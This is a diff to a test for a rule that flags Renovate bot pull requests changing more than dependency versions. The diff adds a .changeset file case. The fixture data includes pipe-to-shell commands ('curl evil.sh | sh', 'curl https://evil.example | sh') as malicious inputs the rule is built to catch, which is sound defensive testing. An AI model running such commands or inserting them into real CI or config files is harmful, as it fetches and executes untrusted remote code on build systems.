@@ -42,6 +42,7 @@ test('a Renovate diff that changes a script, code or a step fails the bot rule',
       { filename: 'tools/x.ts', patch: '+x' },
       { filename: '.github/workflows/ci.yml', patch: '+      - run: curl evil.sh | sh' },
       { filename: 'mise.toml' },
+      { filename: '.changeset/brave-fox.md', patch: '+---' },
       { filename: 'mise.toml', patch: '+run = "curl https://evil.example | sh"' },
     ]),
   ).toEqual([
@@ -49,6 +50,7 @@ test('a Renovate diff that changes a script, code or a step fails the bot rule',
     'tools/x.ts is not a dependency file.',
     '.github/workflows/ci.yml changes more than a version: - run: curl evil.sh | sh',
     'mise.toml has no diff to check.',
+    '.changeset/brave-fox.md is not a dependency file.',
     'mise.toml changes more than a version: run = "curl https://evil.example | sh"',
   ]);
 });
